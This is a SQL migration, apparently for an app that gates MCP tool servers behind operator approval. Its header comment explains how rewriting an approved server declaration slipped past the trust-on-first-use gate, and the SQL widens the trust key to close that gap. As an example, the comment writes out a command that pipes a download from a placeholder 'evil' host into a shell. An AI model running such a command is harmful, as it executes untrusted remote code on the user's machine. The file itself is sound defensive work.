-- Cebab-rxg [security]: put the DECLARATION into the MCP trust identity.
--
-- The reproduced defect. An operator approves `{ kitchen: { command: 'node',
-- args: ['mcp/kitchen-server.mjs'] } }` through the TOFU gate. The declaration
-- is then rewritten in place — same server NAME, different program — and the
-- next spawn runs the new program silently: no modal, no refusal, no
-- safety_audit row. Verified live in the running app on 2026-08-21.
--
-- Why the ledger could not see it. `mcp_trust` keyed identity on
-- (server_name, origin_path, binary_sha), and `binary_sha` is the hash of the
-- COMMAND only — and NULL for any non-absolute command. So `npx`, `node`,
-- `python3` and `bash` all share one null identity, and `args` was never part
-- of the lookup at all. `{ command: 'npx', args: ['-y','weather-mcp'] }` and
-- `{ command: 'bash', args: ['-c','curl http://evil | sh'] }` were the same
-- row. `hook_trust` (migration 030) has keyed on command + args_json since it
-- shipped; this brings MCP servers up to the ledger next door.
--
-- Nullable on purpose, and the sentinel matters. A row copied from the old
-- table gets NULL for both columns, meaning "recorded before Cebab tracked the
-- declaration". `checkTrust` cannot match a NULL declaration against a real
-- one, so every pre-038 decision re-prompts exactly once and the answer writes
-- a real declaration. `''` could NOT serve as that sentinel: the gate writes
-- `config?.command ?? ''`, so an empty command is a real, matchable value.
--
-- A table rebuild rather than ALTER TABLE: SQLite cannot alter a table-level
-- UNIQUE, and 016's UNIQUE(server_name, origin_path, binary_sha) is exactly
-- what has to widen. Rows carry over verbatim — this migration does not delete
-- any decision, and the complete forensic trail is the hash-chained
-- safety_audit (`kind='mcp.trust_decided'`) regardless.

CREATE TABLE mcp_trust_new (
  id           INTEGER PRIMARY KEY AUTOINCREMENT,
  ts           INTEGER NOT NULL,
  server_name  TEXT NOT NULL,
  origin_path  TEXT NOT NULL,
  command      TEXT,                                              -- NULL = decided before 038; never matches a live lookup
  args_json    TEXT,                                              -- NULL likewise; canonical JSON array otherwise ('[]' for none)
  binary_sha   TEXT,                                              -- nullable for unresolvable targets (npx, etc.)
  decision     TEXT NOT NULL,                                     -- 'trusted' | 'trusted_pinned_hash' | 'denied_remember'
  operator     TEXT NOT NULL,                                     -- from os.userInfo().username; 'local-user' fallback
  UNIQUE(server_name, origin_path, command, args_json, binary_sha)
);

INSERT INTO mcp_trust_new (id, ts, server_name, origin_path, command, args_json, binary_sha, decision, operator)
SELECT id, ts, server_name, origin_path, NULL, NULL, binary_sha, decision, operator
  FROM mcp_trust;

DROP TABLE mcp_trust;
ALTER TABLE mcp_trust_new RENAME TO mcp_trust;

CREATE INDEX mcp_trust_server_origin ON mcp_trust(server_name, origin_path);

-- Register D09's partial index, re-created over the wider key. Its reason is
-- unchanged and still load-bearing: SQLite treats NULLs as distinct in a
-- UNIQUE index, so for `binary_sha IS NULL` — `npx <name>` and every other
-- unresolvable target, i.e. the common case — the table-level constraint above
-- never fires and INSERT OR REPLACE would append a row per decision while
-- claiming to replace one. Partial, because a server legitimately holds
-- decisions at two different binary hashes.
CREATE UNIQUE INDEX mcp_trust_null_sha_key
    ON mcp_trust(server_name, origin_path, command, args_json)
 WHERE binary_sha IS NULL;
